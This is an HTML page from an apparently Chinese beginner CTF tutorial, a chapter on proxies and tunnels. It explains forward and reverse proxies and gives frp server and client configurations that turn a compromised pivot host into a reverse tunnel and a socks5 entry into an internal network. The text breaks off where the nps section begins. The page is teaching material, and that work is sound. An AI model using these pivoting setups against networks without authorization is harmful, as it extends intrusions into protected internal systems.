@@ -1,0 +1,1449 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>代理与隧道 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link on" href="./">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="_1">代理与隧道<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
+<p>在 CTF 和渗透测试中，我们常常遇到这样的场景：目标网站有漏洞，但真正的数据库、内网服务或第二台主机藏在防火墙后面，你的电脑根本访问不到。代理与隧道技术解决的就是这个"够不着"的问题——把已经攻下的主机当作跳板，让流量借道而行。</p>
+<p>本章先讲清正向代理与反向代理的区别，然后依次介绍 frp、nps、EW、Venom 这几个最常用的工具，再聊聊 ICMP/DNS 这类"曲线救国"的隧道，最后讲如何用 proxychains/Proxifier 把自己的工具接进代理链。如果你学过「SSRF注入」一章，会发现本章是它的实战延续——SSRF 是让服务器替我们发请求，而代理与隧道是让服务器替我们转发所有流量。</p>
+<h2 id="_2">正向代理与反向代理<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<p>这两个概念是本章一切工具的基础，务必先分清。</p>
+<p><strong>正向代理（Forward Proxy）</strong>：代理服务器代表"客户端"去访问目标。客户端知道自己挂了代理，目标服务器不知道真实的客户端是谁。典型用途是科学上网、隐藏真实 IP。流量方向是"内向外"：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>攻击机 ──&gt; 代理服务器（跳板）──&gt; 目标服务
+</code></pre></div>
+<p><strong>反向代理（Reverse Proxy）</strong>：代理服务器代表"服务端"接收请求，再把请求分发给后端真实服务器。客户端不知道后面还有别的机器。Nginx 做负载均衡就是反向代理。流量方向是"外向内"：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>攻击机 ──&gt; 反向代理（跳板对外暴露端口）──&gt; 内网服务
+</code></pre></div>
+<p>一句话记忆：<strong>正向代理隐藏客户端，反向代理隐藏服务端</strong>。</p>
+<p>在 CTF 内网渗透场景中，这两种模式对应两种打法：</p>
+<ul>
+<li>跳板机 <strong>能出网</strong>（能连到我们的公网 VPS）：用反向连接——跳板主动连 VPS，把内网服务"推"出来，frp/nps 就是这种思路。</li>
+<li>跳板机 <strong>不能出网但能被我们访问</strong>：用正向代理——在跳板上开一个 socks5 端口，我们连上去借道，EW 的 <code>ssocksd</code> 就是这种思路。</li>
+</ul>
+<h2 id="frp">frp：最常用的内网穿透工具<a class="headerlink" href="#frp" title="Permanent link">¶</a></h2>
+<p>frp（Fast Reverse Proxy）是 Go 写的反向代理工具，分为服务端 <code>frps</code>（部署在公网 VPS）和客户端 <code>frpc</code>（部署在内网跳板）。客户端主动连接服务端建立控制通道，之后访问 VPS 的某个端口就等于访问内网的某个服务。</p>
+<h3 id="_3">服务端配置<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<p>在公网 VPS 上创建 <code>frps.toml</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">bindPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7000</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">auth</span><span class="p">.</span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"hello_ctf_secret"</span>
+</code></pre></div>
+<p>启动：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>./frps<span class="w"> </span>-c<span class="w"> </span>frps.toml
+</code></pre></div>
+<p><code>bindPort = 7000</code> 是 frpc 与 frps 之间控制通道的端口，记得在防火墙/安全组放行它。</p>
+<h3 id="tcp">客户端配置（转发单个 TCP 端口）<a class="headerlink" href="#tcp" title="Permanent link">¶</a></h3>
+<p>假设内网有一台 Web 服务器 <code>10.0.0.5:80</code>，跳板机能访问它。在跳板机上创建 <code>frpc.toml</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">serverAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"你的VPS公网IP"</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">serverPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7000</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">auth</span><span class="p">.</span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"hello_ctf_secret"</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">[[proxies]]</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"web"</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"tcp"</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">localIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"10.0.0.5"</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">localPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">80</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">8080</span>
+</code></pre></div>
+<p>启动 <code>./frpc -c frpc.toml</code> 后，攻击机访问 <code>http://VPS公网IP:8080</code> 就等于访问内网的 <code>10.0.0.5:80</code>。这就是反向代理的打法：流量先到 VPS 的 8080 端口，再沿已建立的通道回到跳板，最终送达内网服务。</p>
+<h3 id="socks5">socks5 插件（访问整个内网）<a class="headerlink" href="#socks5" title="Permanent link">¶</a></h3>
+<p>上面的方式每访问一个服务就要配一条规则，很麻烦。frp 提供了一个 socks5 插件，一条规则就能让整个内网可达：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">serverAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"你的VPS公网IP"</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">serverPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7000</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">auth</span><span class="p">.</span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"hello_ctf_secret"</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="k">[[proxies]]</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"socks5"</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"tcp"</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1080</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="k">[proxies.plugin]</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"socks5"</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ctf"</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ctf123"</span>
+</code></pre></div>
+<p>启动后，VPS 的 1080 端口就是一个 socks5 代理入口，攻击机连上它就能访问跳板机所在内网的任意 IP 和端口。配合后文的 proxychains，nmap、curl、浏览器都能直接打内网。</p>
+<h2 id="nps-ew">nps 与 EW：另两个常用选手<a class="headerlink" href="#nps-ew" title="Permanent link">¶</a></h2>
+<h3 id="nps-web-frp">nps：带 Web 管理面板的 frp<a class="headerlink" href="#nps-web-frp" title="Permanent link">¶</a></h3>
